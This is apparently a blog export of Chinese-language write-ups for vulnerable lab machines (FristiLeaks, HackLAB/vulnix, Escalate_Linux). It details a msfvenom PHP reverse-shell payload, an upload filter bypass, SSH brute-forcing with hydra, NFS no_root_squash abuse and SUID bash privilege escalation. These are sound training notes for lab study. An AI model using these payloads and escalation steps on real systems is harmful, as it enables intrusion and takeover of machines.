474eb5cb0f68e48712a6937b538f56e7bdad10bbd889e6f255b6591358d57064703d3ce52d378f0385beadc83994e43ad24e97c25d1dbd17b755c8c04f6460e2e9ac13ead3a2557bc9852b19ebd1d1ec0bd738857a51549d660fbae732941c03ab69a4aa9a40b50b329e1ec8cd691f4e3f7bd45e5c3201c08c7bf2435f15210ab7e43054360f767bba50f261c4e05351465fcf55262886bbcd514fd29cb396335fcfd6857efac464cceb88bdbec0df1e5050c0a74222efe9218361cf174823925ce79df3fd5db2e53bd0020ca42b67be43acd3b1d7f2f7f69e5280becf30054a92a0b3d80af729adfb9addd3e26038997d9e14c3188c006f27477448e747d0beab78cb64c135e01e840f9c14056156b3bc19449635f32d7f1fecc4adca6d2e68fbb47cb320f43ac867d31d4839c53e17fd932c64cd5e4e3e8b559484945d5e0b818923f9da71e21807365922ba946dc16097f26bf2ba16521f4948ed10eb6770bcbacc650e21caf23989d66b949aef3b174f91063ac10e499ce544fe28e4277f48a215e50876799dbcf3ea3da0ca6a8f7e461fad5073ec04d469bc04073de54030b18bffaf7c3cb6fb8522e10e28820637aaaaffef333057c9c59de294e1d667302b1f702b7d9c7f0be4c9b93b7b637f76f054b17112cbb2bc43d3072ffef02a7491fedfe2b8cd2cd91b2edbabb15a800c8ffddb828bac2b5aa393b501031d400650cf0443a9b85223b9827980f84a5a4793943c626ddd8970263b6bb66fd2206f6d895baf5584f9bea16c70b0ca1ae8bc59ce6bb980d55066ac5b24ca85bad6de11f2ea9b0431252a3a2b5fc0d549ecdb63a884a81fd22041b861e7540a5fda0c4e0ba55f92f365a6e2591649da8af55e524369b3d4233c2aff8516bb227943fed9cbe5d7de1d311d8f627fa572d5174fd392f1080457fe052f981ed882e989ab921143057f3c9684791e7393f5f4087ca8adb7d0085d7ac56bb333b6a77201a225dd268bdb1afd5e2b144c03edf954d1bf4ddfce9570ef29f7e5615b01085b9f44b3d113abdc7619e40f540c25b827afc48980289269e531ab6a6f848cb58124d90c285a6e909f4c9e4ef4d2d8c6db448b79885d0d5233c4d21a03b7f474a9c90e16b049d9666264b307977041505d7b9ecc07a078c6f6794f47fabd0c8504504e5442ed00fb4f9c847f8d4278549f145e865bc8f0efdf41c919678bf52cdc93e182f8fdc2f1b27d15c5a7568b2ea4f5228600749e339f044e19d97a84241e3d1c3d57c4d0dee7c47e0337eaef0dc74d6073eb19ff6c4044082e161fd16e48f0ada9b2f22658ec58fe10ed34726fc56beeb22f13dfa18034ff3ba6793ace4886acdaaa92eaeab469817fdb302dc966087c532c92a3ae71234c34d6b2e6aeb15f37afa50c8c3233de8d90d7cbc3dbfb438897ce5a9a3c532cc061ada70028cafe5778a45ad5f4f2dbdbfae72d925320e110faded7dc0ab8173c3d62a1b7a0d39840bcd2ea62e9c15ba3be4ffceb918133ceaf67529dfc3436ebed804ebfbdfe45d11c186103c321ba348f7a8f49132eac99105ad404891160b8e73eca6fb2a1a81b5b0e49b3dc110f9f9c06ec091b3ea28c988f5d4a3c6ecc57be5981fc34334a4ef86eb38662f0d9d34e70f9b4db8ae27b27b873d7e14dcd244cee2078f6b1d1e7493d17de8a8098949fa34ecd33653f903edff7cf1ddcf1371056ea463e52e68a0029e69bf5b5a50dd25fed34838b49904cabc8af554201f79445c031b011c6ee360034cb759f68d3cd3ae2e7783c515c7d5d33474e21bce2cc5a6edd78c4ede44bf71c13bbe7f670c195660ccd069b67eb0f9221726d5b6a29d3f91ca287d9256c5a813b466c98f1a71f2dc2eca651562e05d8e05e3c93f3f3ef3d0ae84cfa94da052b1c51bf5716a62d125c8513be9e1c659a63d5f60b75428363d657eaa3aacc0e8405d36177b6e6aa088ff8e6a84846060aca0157d3aa87771bf6414be588a9a97082ae13a80bf98af76cbc3b9536a132ee3dc08c0f8e347f0d26f42ac2e33868a77dbe7c9d926ad7498ae881cab17725608e6718066d7bb555d10d58c09b440c14ef1a521ab0cf2946a5052462c43e0f4902d2e413ffb9948df4f30a32e5c0e53fb6ae6b388ae32f801088001ce43655edc3eca4a1c568875180992348697d6972214b3d99dad5f049d3718490f21d1dd0e0a059e460f9d6956012f5d73d131f11360d23bf25ecec3ae7597b28723b57a193dc54dce05f813552dc36d2c39f6d84104b2c96bf8983ed7ab6af7cb5fcb61df539956f049136b1d5cf1f1fa3040323e26cf433dcb4ae6d1db838cb37c9b3b0f2c25610bd501db1e2216341dde511be24741a67a79a075a90b9a21810be9382cd45c04ed40978f5f8568e6cd1e72a86388fbbf9355ee073b4a371b31ab54cf3b8c1e5a74e474731b93ee1b6321ce3c80eb7d0b7dffe86c760e6004c13fc9a9dd82a86d1c3b2a07368203ab780eba30b7d615e75b1ccd12ee0594244e1c70f45fda60c6a74f2116c84689f4aafdc3ef1365b35707f729c47d0e1e3c7f5510377fbfb440370da18b7bfd2ecba33443170f680ebe5d23184eb10f4044507779b6f27385edba16dcf9afe4fec3af89dafc853581f19a2e15597de7abfca6908106f9d69a86e0cb58cc724a95ecdab566504259cd51ddd57f5b881e35ba4fb7b228a49fc69b05fa5840decdbfcfdf155e2deed17d72e39efdeb40c0fd69ee59e197f2187d8949c3e64eb02b3f04ad5768a7fe28e1931ba4dabeb89d9d134a1d801d116c883a663685eada22510af3da1a2a540d5ab58ba3d2e38583a996100583f16ccbfc05cebb9f5895faab0e7770a20879d407b7b9efe1280fa007f26c90708aae1e78ac4bca3456c3af484f53fb28aeee3526d44e0ed929f655854aaf0ea42f19cfcbe7a3a8836b98cd44434d0ff8da86a9e41d3612300446a694ef045d17edf58643c1aa40ba5de3a4b11c35f56f95bd746ccb0909ec5eda75c5fc29f48cd85e2a5de0ae77f33a69398a7320ccfe8e67d6d304f81d4f2d49a334523800c3c25d25237ec3e95145181ce8e837384831e642918c0cf8842dd7cf3a1e6f3f5b902819ac76444896483d362e99687f8633fdae75a8efa498594657076f80adbd3cbf04f476a0dac991f7877f4344be7b741f33fc05493ada27a7cbac54f633db6a2d874d285676ed6c0e5f09ca46f7cbccea82b10c4a93cce07fb836e2084404bc4d934ce9987340ad06b245d55c5d32d95e2fbea7713d71287b2d3526b87a61e32ed749f231f6274a4c11e7c647635df76ae2686a282a2efa55b4d09ac102733697efaa8dcb9024efe368e3a0c1bd420f35f524c92c38ce34dc149ecadb2c2fc94bee03d3ce9f8e45dd5f0d01063daded820e1e0df6a9c38e0e4094db1cd97548554a9120a1720f31ca03f07bbf53607f911883d04212f6576997fe5515d33456d97b63c16c17f7e3a47ca89e9738279a196b56db384fef5bb4dfe1112da3f6bab24f1f3eed2a586b4c69503d2ab8bfbc4b2c48d8c30a30159588c6440766315b0b71f8d5239242c64067a57bcb6a8f89d26b0ff6595d779d240fb6e993bf528a3af2be40fb977e38f3f018531968a6ddfdd29bda8befee17425f16f9fa1093e82f8fc237b2e1bf00a9e4e1f94d126a052ac09c8b91ff294bbca80b64aece12daeb872d644600e165b1d11599dc7cf45fd070ec75a777e49673a5039f6ae46b2af728c820561033d8c159c05783acdccac88a2f6efc5a9bdf771556a08ca06781a5e7337dc65ddede634deba3d71f291ab8cb4f6f6b82bc4f5ce7a08369c129f271b0712ded3294861a585d5c3118348e9d11b0fa17dc328e335f8f34a7230df26239fde17a58952328700aebd9f91787e3503e0c0b2b4c921381f43face8c761dd964473db82da0d1e6acfadef18311b71909b2902d9ec1495c7c4b5549f5a387762d7a4574fd17e045e695eb81acd0934b2176d2ceb3ea594e2625c055ce187876b69a6a89cdad3e553af77d30be5dc1ad27258c7384050a4f63604341962810127b861dbc224d9a9b2f4cd9b1aefebf1aceb4d6e2aa09f2ad4eae92cc699ed0f0a5cd41b8ff3a8f32d73db64cfd94ff7e46cee64ac9a043c35cf256e9299751372b148a217df2f595238887dda3bdd748951a1f450402d483f48c714a8d35f332f8f441b25bd3c01ea7fa29f5e8360ee98f0fe8c7ba51af1f11c82b730f30bdcb6b6a6ed7e1e3d9fc9bbfcb219547112839f5342452c5ba9c4a8dafb5fbf332444655a704a12e3046c36f07149709531815acaf188dbd0cad3b47e744a1db2ca34e431c6b2a9874880e1cb186ca22d301608e2a81f5c459f05575280f4e8c77a543897e89dbff4ab17b26207ab20bc4dc4e28819c51810f77df0e9344d9c79ebfbae2fb0d5edc4d286488992f50d1fe20c9f60beb7dc8997cab2abbbb71b7a8baf6eb76963243253aeddb2b6d2fb648ba2b6502cc7070b609b233b63eabf942357cf74931165b80219da0613e3b03bf705236f7eec408b98902f9260fb0b12240310c61ba77748df47f9f43ebdb544f318070405b24d5e7c4d581ccc23e1d34d402de1f841105eba70025731dbcd5d8dc83f086d45782f5b0f1c487863682c3b5647737dcb56c2552a9cdee5cb080229f7cc5ff33a54aca86874dd355fe318be6efd90ee1f0c34631f5a9a03154fdd51c98c52c07d19034953c415f697bef33c4e796c7cff30522c9bf5f29cc480103868eab2799995717c30c567498972781829cd44d9850923b8b154d012941c201eed8bca9a7d4ddc146a8b6c5cca4719f9f08734154239e933e303c1296d1370d40ac1825b810b9c6b1b3c346ef6573ad742b75f55792918dd3276b9383995de42a59970faec90aaa9b8446ecb678574c3089ef44f99f13154977ac4352501ccf3f6cad9ca0a3bcb5f28d7c986ae70d7a6ab9ca3a8df24d477e84cc1d530394739bd1efc2404ac29910f7f92f555d7c74fbab220d49d69f235a282f59ee768f90d68281324107cb4b8312e2d6544147ce02</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">root hash($6...F.)</span>
      </label>
    </div>
  </div>
</div>
<script src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>靶场FristiLeaks 1.3</title>
    <url>/2020/05/29/%E9%9D%B6%E5%9C%BAFristiLeaks-1-3/</url>
    <content><![CDATA[<h1 id="FristiLeaks"><a href="#FristiLeaks" class="headerlink" title="FristiLeaks"></a>FristiLeaks</h1><p>Kali:192.168.1.3</p>
<p>靶机:192.168.1.221</p>
<p>安装前要修改MAC:<code>08:00:27:A5:A6:76</code></p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/FristiLeaks/1.jpg" alt="1"></p>
<p>只开放了80端口</p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>只开放了80端口，通过Nmap已经发现了robots.txt</p>
<p><img src="/images/FristiLeaks/2.jpg" alt="2"></p>
<p>不过三个目录都没有任何发现</p>
<p>接下来我进行了目录枚举</p>
<p><img src="/images/FristiLeaks/3.jpg" alt="3"></p>
<p>发现了一个目录</p>
<p><img src="/images/FristiLeaks/4.jpg" alt="4"></p>
<p>keep-calm.png指向一个张图片</p>
<p><img src="/images/FristiLeaks/5.jpg" alt="5"></p>
<p>根据图片猜测目录<code>/fristi</code></p>
<p><img src="/images/FristiLeaks/6.jpg" alt="6"></p>
<p>查看网页代码，发现了一些有趣的信息</p>
<p><img src="/images/FristiLeaks/7.jpg" alt="7"></p>
<p>这是一段base64信息，进行解码</p>
<p><img src="/images/FristiLeaks/8.jpg" alt="8"></p>
<p>发现是一个PNG，将它还原</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">base64 -d 1.txt &gt; 1.png</span><br></pre></td></tr></table></figure>

<p><img src="/images/FristiLeaks/9.jpg" alt="9"></p>
<p>根据源代码提示的用户名，我们可以得出账号密码</p>
<p>eezeepz/keKkeKKeKKeKkEkkEk</p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><h3 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3><p><img src="/images/FristiLeaks/10.jpg" alt="10"></p>
<p>登录成功后，是一个上传页面<br>尝试上传木马</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p php&#x2F;reverse_php LHOST&#x3D;192.168.1.3 LPORT&#x3D;4444 -f raw -o evil.php</span><br></pre></td></tr></table></figure>

<p><img src="/images/FristiLeaks/11.jpg" alt="11"></p>
<p>失败，对文件格式有限制，尝试修改后缀名绕过<code>evil.php.jpg</code></p>
<p><img src="/images/FristiLeaks/12.jpg" alt="12"></p>
<p>成功绕过，获得了低权限的shell</p>
<p><img src="/images/FristiLeaks/12.jpg" alt="12"></p>
]]></content>
      <categories>
        <category>vulnhub</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>靶场HackLAB</title>
    <url>/2020/09/13/%E9%9D%B6%E5%9C%BAHackLAB/</url>
    <content><![CDATA[<h1 id="HackLab"><a href="#HackLab" class="headerlink" title="HackLab"></a>HackLab</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>kali:192.168.1.201</p>
<p>目标:192.168.1.205</p>
<h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">masscan -p1-65535 192.168.1.205 --rate&#x3D;1000 -e eth0 &gt; ports</span><br><span class="line">ports&#x3D;$(cat ports | awk -F &quot; &quot; &#39;&#123;print $4&#125;&#39; | awk -F &quot;&#x2F;&quot; &#39;&#123;print $1&#125;&#39; | sort -n | tr &#39;\n&#39; &#39;,&#39; | sed &#39;s&#x2F;,$&#x2F;&#x2F;&#39;)</span><br><span class="line">nmap -Pn -sV -sC -p$ports 192.168.1.205 -oN nmap</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PORT      STATE SERVICE    VERSION</span><br><span class="line">22&#x2F;tcp    open  ssh        OpenSSH 5.9p1 Debian 5ubuntu1 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   1024 10:cd:9e:a0:e4:e0:30:24:3e:bd:67:5f:75:4a:33:bf (DSA)</span><br><span class="line">|   2048 bc:f9:24:07:2f:cb:76:80:0d:27:a6:48:52:0a:24:3a (RSA)</span><br><span class="line">|_  256 4d:bb:4a:c1:18:e8:da:d1:82:6f:58:52:9c:ee:34:5f (ECDSA)</span><br><span class="line">25&#x2F;tcp    open  smtp       Postfix smtpd</span><br><span class="line">|_smtp-commands: vulnix, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, </span><br><span class="line">| ssl-cert: Subject: commonName&#x3D;vulnix</span><br><span class="line">| Not valid before: 2012-09-02T17:40:12</span><br><span class="line">|_Not valid after:  2022-08-31T17:40:12</span><br><span class="line">|_ssl-date: 2020-09-13T23:23:31+00:00; +7h59m56s from scanner time.</span><br><span class="line">79&#x2F;tcp    open  finger     Linux fingerd</span><br><span class="line">|_finger: No one logged on.\x0D</span><br><span class="line">110&#x2F;tcp   open  pop3       Dovecot pop3d</span><br><span class="line">|_pop3-capabilities: CAPA TOP PIPELINING RESP-CODES UIDL STLS SASL</span><br><span class="line">| ssl-cert: Subject: commonName&#x3D;vulnix&#x2F;organizationName&#x3D;Dovecot mail server</span><br><span class="line">| Not valid before: 2012-09-02T17:40:22</span><br><span class="line">|_Not valid after:  2022-09-02T17:40:22</span><br><span class="line">|_ssl-date: 2020-09-13T23:23:30+00:00; +7h59m56s from scanner time.</span><br><span class="line">111&#x2F;tcp   open  rpcbind    2-4 (RPC #100000)</span><br><span class="line">| rpcinfo: </span><br><span class="line">|   program version    port&#x2F;proto  service</span><br><span class="line">|   100000  2,3,4        111&#x2F;tcp   rpcbind</span><br><span class="line">|   100000  2,3,4        111&#x2F;udp   rpcbind</span><br><span class="line">|   100000  3,4          111&#x2F;tcp6  rpcbind</span><br><span class="line">|   100000  3,4          111&#x2F;udp6  rpcbind</span><br><span class="line">|   100003  2,3,4       2049&#x2F;tcp   nfs</span><br><span class="line">|   100003  2,3,4       2049&#x2F;tcp6  nfs</span><br><span class="line">|   100003  2,3,4       2049&#x2F;udp   nfs</span><br><span class="line">|   100003  2,3,4       2049&#x2F;udp6  nfs</span><br><span class="line">|   100005  1,2,3      46413&#x2F;tcp   mountd</span><br><span class="line">|   100005  1,2,3      53298&#x2F;tcp6  mountd</span><br><span class="line">|   100005  1,2,3      54484&#x2F;udp6  mountd</span><br><span class="line">|   100005  1,2,3      55117&#x2F;udp   mountd</span><br><span class="line">|   100021  1,3,4      37588&#x2F;udp6  nlockmgr</span><br><span class="line">|   100021  1,3,4      49202&#x2F;udp   nlockmgr</span><br><span class="line">|   100021  1,3,4      53622&#x2F;tcp   nlockmgr</span><br><span class="line">|   100021  1,3,4      54487&#x2F;tcp6  nlockmgr</span><br><span class="line">|   100024  1          42869&#x2F;tcp   status</span><br><span class="line">|   100024  1          46115&#x2F;udp   status</span><br><span class="line">|   100024  1          46406&#x2F;udp6  status</span><br><span class="line">|   100024  1          49853&#x2F;tcp6  status</span><br><span class="line">|   100227  2,3         2049&#x2F;tcp   nfs_acl</span><br><span class="line">|   100227  2,3         2049&#x2F;tcp6  nfs_acl</span><br><span class="line">|   100227  2,3         2049&#x2F;udp   nfs_acl</span><br><span class="line">|_  100227  2,3         2049&#x2F;udp6  nfs_acl</span><br><span class="line">143&#x2F;tcp   open  imap       Dovecot imapd</span><br><span class="line">|_imap-capabilities: IMAP4rev1 IDLE STARTTLS listed more LITERAL+ have SASL-IR ENABLE capabilities LOGIN-REFERRALS LOGINDISABLEDA0001 Pre-login post-login OK ID</span><br><span class="line">| ssl-cert: Subject: commonName&#x3D;vulnix&#x2F;organizationName&#x3D;Dovecot mail server</span><br><span class="line">| Not valid before: 2012-09-02T17:40:22</span><br><span class="line">|_Not valid after:  2022-09-02T17:40:22</span><br><span class="line">|_ssl-date: 2020-09-13T23:23:31+00:00; +7h59m56s from scanner time.</span><br><span class="line">512&#x2F;tcp   open  exec?</span><br><span class="line">513&#x2F;tcp   open  login?</span><br><span class="line">514&#x2F;tcp   open  tcpwrapped</span><br><span class="line">993&#x2F;tcp   open  ssl&#x2F;imap   Dovecot imapd</span><br><span class="line">|_imap-capabilities: IMAP4rev1 IDLE ENABLE listed LITERAL+ more SASL-IR LOGIN-REFERRALS capabilities AUTH&#x3D;PLAINA0001 have Pre-login post-login OK ID</span><br><span class="line">| ssl-cert: Subject: commonName&#x3D;vulnix&#x2F;organizationName&#x3D;Dovecot mail server</span><br><span class="line">| Not valid before: 2012-09-02T17:40:22</span><br><span class="line">|_Not valid after:  2022-09-02T17:40:22</span><br><span class="line">|_ssl-date: 2020-09-13T23:23:31+00:00; +7h59m56s from scanner time.</span><br><span class="line">995&#x2F;tcp   open  ssl&#x2F;pop3   Dovecot pop3d</span><br><span class="line">|_pop3-capabilities: CAPA TOP PIPELINING RESP-CODES UIDL USER SASL(PLAIN)</span><br><span class="line">| ssl-cert: Subject: commonName&#x3D;vulnix&#x2F;organizationName&#x3D;Dovecot mail server</span><br><span class="line">| Not valid before: 2012-09-02T17:40:22</span><br><span class="line">|_Not valid after:  2022-09-02T17:40:22</span><br><span class="line">|_ssl-date: 2020-09-13T23:23:31+00:00; +7h59m56s from scanner time.</span><br><span class="line">2049&#x2F;tcp  open  nfs_acl    2-3 (RPC #100227)</span><br><span class="line">32846&#x2F;tcp open  mountd     1-3 (RPC #100005)</span><br><span class="line">42869&#x2F;tcp open  status     1 (RPC #100024)</span><br><span class="line">46413&#x2F;tcp open  mountd     1-3 (RPC #100005)</span><br><span class="line">50617&#x2F;tcp open  mountd     1-3 (RPC #100005)</span><br><span class="line">53622&#x2F;tcp open  nlockmgr   1-4 (RPC #100021)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>逐个检查</p>
<p><strong>25端口</strong>，nmap发现开启了VRFY命令，通过它来枚举用户</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">smtp-user-enum -M VRFY -U &#x2F;usr&#x2F;share&#x2F;seclists&#x2F;Usernames&#x2F;Names&#x2F;names.txt -t 192.168.1.205					&#x2F;&#x2F;这里不好使</span><br><span class="line">smtp-user-enum -M VRFY -U &#x2F;usr&#x2F;share&#x2F;metasploit-framework&#x2F;data&#x2F;wordlists&#x2F;unix_users.txt -t 192.168.1.205</span><br></pre></td></tr></table></figure>

<p><img src="/images/HackLab/1.png" alt="1"></p>
<p><strong>79端口</strong>，finger枚举</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;finger-user-enum.pl -U &#x2F;usr&#x2F;share&#x2F;metasploit-framework&#x2F;data&#x2F;wordlists&#x2F;unix_users.txt -t 192.168.1.205</span><br></pre></td></tr></table></figure>

<p>或者使用<a href="https://raw.githubusercontent.com/Kan1shka9/Finger-User-Enumeration/master/finger_enum_user.sh">https://raw.githubusercontent.com/Kan1shka9/Finger-User-Enumeration/master/finger_enum_user.sh</a><br>需要打开文件修改ip</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;finger_enum_user.sh &#x2F;usr&#x2F;share&#x2F;metasploit-framework&#x2F;data&#x2F;wordlists&#x2F;unix_users.txt</span><br></pre></td></tr></table></figure>

<p><strong>111端口</strong>，rpcinfo端口枚举</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rpcinfo -p 192.168.1.205</span><br></pre></td></tr></table></figure>

<p>这里我们可以获得和NMAP相似的输出，没啥大用</p>
<p><strong>2049端口</strong>，NFS枚举</p>
<p><img src="/images/HackLab/2.png" alt="2"></p>
<p>找到了一个可以挂载的地方，看来是一个用户的目录，尝试挂载</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:&#x2F;tmp#mount -t nfs 192.168.1.205:&#x2F;home&#x2F;vulnix &#x2F;tmp&#x2F;tmp&#x2F;</span><br><span class="line">root@kali:&#x2F;tmp#cd tmp&#x2F;</span><br><span class="line">bash: cd: tmp&#x2F;: Permission denied</span><br></pre></td></tr></table></figure>

<p>可以挂载，但进不去</p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>这些把基本能枚举都枚举了，没有捷径了，尝试用枚举出的用户爆破SSH</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hydra 192.168.1.205 ssh -l user -P &#x2F;usr&#x2F;share&#x2F;seclists&#x2F;Passwords&#x2F;darkweb2017-top1000.txt -t 6 -V -f</span><br></pre></td></tr></table></figure>

<p><img src="/images/HackLab/3.png" alt="3"></p>
<p>爆破成功，获取了凭据<code>user/letmein</code>，直接进行ssh连接</p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>当前用户不处于sudo组，想到还有NFS目录可以使用，也许可以利用它来切换用户</p>
<p>linpeas扫描</p>
<p><img src="/images/HackLab/5.png" alt="5"></p>
<p>符合预期，这里设置了root_squash，并且是rw权限</p>
<p><img src="/images/HackLab/4.png" alt="4"></p>
<p>我们找到vulnix的UID和GID<br>接着在kali上创建相同UID和GID的用户，绕过进目录的权限</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">useradd -u 2008 vulnix</span><br></pre></td></tr></table></figure>

<p><img src="/images/HackLab/6.png" alt="6"></p>
<p>成功进入，准备生成ssh密钥，并写入公钥</p>
<p>生成密钥对，复制公钥</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh-keygen</span><br><span class="line">cat &#x2F;root&#x2F;.ssh&#x2F;id_rsa.pub</span><br></pre></td></tr></table></figure>

<p><img src="/images/HackLab/7.png" alt="7"></p>
<p>创建.ssh，并写入公钥到authorized_keys</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mkdir .ssh</span><br><span class="line">cd .ssh</span><br><span class="line">echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC9QhR2KeFliuFg7nZRishNh1+nziQlv6w9IbOgGAC3f8pvVToDkOAJVENJr7ZUHkPLqm&#x2F;1aiiqSES5fOrDJFiMbey0lUdObIHS178c80MhR0JD7MkAdiIe7LPCziEUaL6LyeugD2DwDrCUXuPqSefazH5caJILkB4AESGq4SygkZX4m0rvOS5pYBdEYFQapFEV0CDQxnNTDC03+1DLuo+s1L5iG4rxNZNfgp7sXUoHk2jzzCYL4c+XI293Y1LOMbPgBlY8hjSjrbOBQJb1Ia90Dw5bPIERWB3BZVkpQjnj2KJhnMW7OTOnHyY0Qdl9wCT1zktok2Jvvrln4ecaE1x&#x2F;O8M4y3Jw0OuQSxaAXPplly19N8P7WfdiLKbHDMx&#x2F;3XHoUk8jVD7XQKeDVMK2rLme0fyPsyst18H85qpZBgW3SVSoX6YVCMDosxOA6p1JeMJQ1H4SiHCTvhbKh1Pmnm4VMGlwintGaHzXz4EKkRCNV6CmpERANZYuXnHG4D9BPJ8&#x3D; root@kali &gt; authorized_keys</span><br></pre></td></tr></table></figure>

<p><img src="/images/HackLab/8.png" alt="8"></p>
<p>这样我们就可以切换用户了</p>
<p><img src="/images/HackLab/9.png" alt="9"></p>
<h3 id="no-root-squash提权"><a href="#no-root-squash提权" class="headerlink" title="no_root_squash提权"></a>no_root_squash提权</h3><p>重新开始信息收集，发现</p>
<p><img src="/images/HackLab/10.png" alt="10"></p>
<p>我们可以sodoedit编辑NFS的配置文件，直接替换</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;home&#x2F;vulnix    *(rw,root_squash)</span><br><span class="line">替换成</span><br><span class="line">&#x2F;home&#x2F;vulnix    *(rw,no_root_squash)</span><br></pre></td></tr></table></figure>

<p>no_root_squash是常用提权手段，进入NFS分享的目录可以获得root权限</p>
<p>这里要犯规了，我们需要重启NFS，但是我们又不是root，只能重启虚拟机</p>
<p>重启后重新挂载</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">df</span><br><span class="line">umount 192.168.1.205:&#x2F;home&#x2F;vulnix</span><br></pre></td></tr></table></figure>

<p>这里由于设置了no_root_squash，我们不再需要切换用户</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mount -t nfs 192.168.1.205:&#x2F;home&#x2F;vulnix &#x2F;tmp&#x2F;tmp&#x2F;</span><br><span class="line">cd &#x2F;tmp&#x2F;tmp	</span><br></pre></td></tr></table></figure>

<p>接着利用SUID提权，这里有个坑，我把kali的bash复制过去，会报错</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-bash: .&#x2F;bash: cannot execute binary file</span><br></pre></td></tr></table></figure>

<p>我们可以在目标机器上，复制目标的/bin/bash到分享的目录，然后在kali中执行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:&#x2F;tmp&#x2F;tmp#chown root:root bash</span><br><span class="line">root@kali:&#x2F;tmp&#x2F;tmp#chmod 4777 bash</span><br></pre></td></tr></table></figure>

<p>这样我们就可以提权了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;bash -p</span><br></pre></td></tr></table></figure>

<p><img src="/images/HackLab/11.png" alt="11"></p>
]]></content>
      <categories>
        <category>vulnhub</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>靶场Escalate_Linux: 1</title>
    <url>/2020/09/19/%E9%9D%B6%E5%9C%BAEscalate-Linux-1/</url>
    <content><![CDATA[<h1 id="Escalate-Linux-1"><a href="#Escalate-Linux-1" class="headerlink" title="Escalate_Linux 1"></a>Escalate_Linux 1</h1><p>kali:192.168.1.201<br>目标:192.168.1.232</p>
<p>这台机器专门练习linux提权</p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">masscan -p1-65535 192.168.1.232 --rate&#x3D;1000 -e eth0 &gt; ports</span><br><span class="line">ports&#x3D;$(cat ports | awk -F &quot; &quot; &#39;&#123;print $4&#125;&#39; | awk -F &quot;&#x2F;&quot; &#39;&#123;print $1&#125;&#39; | sort -n | tr &#39;\n&#39; &#39;,&#39; | sed &#39;s&#x2F;,$&#x2F;&#x2F;&#39;)</span><br><span class="line">nmap -Pn -sV -sC -p$ports 192.168.1.232 -oN nmap</span><br></pre></td></tr></table></figure>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>NFS枚举</p>
<p><img src="/images/Escalate-Linux-1/2.png" alt="2"></p>
<p>这里的reverse_shell在</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.1.232&#x2F;shell.php?cmd&#x3D;</span><br></pre></td></tr></table></figure>

<p>初始shell为user6</p>
<p><img src="/images/Escalate-Linux-1/3.png"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h3 id="1-SUID"><a href="#1-SUID" class="headerlink" title="1 SUID"></a>1 SUID</h3><p><img src="/images/Escalate-Linux-1/4.png" alt="4"></p>
<p>发下了两个SUID，其中/home/user3/shell可以直接获取root</p>
<p><img src="/images/Escalate-Linux-1/5.png" alt="5"></p>
<p>/home/user5/script</p>
<p><img src="/images/Escalate-Linux-1/6.png" alt="6"></p>
<p>初步猜测执行了ls命令，而且SUID的权限是root</p>
<p><img src="/images/Escalate-Linux-1/7.png" alt="7"></p>
<p>传回本地分析，可以基本确认它通过PATH调用了ls<br>可以通过环境变量进行提权</p>
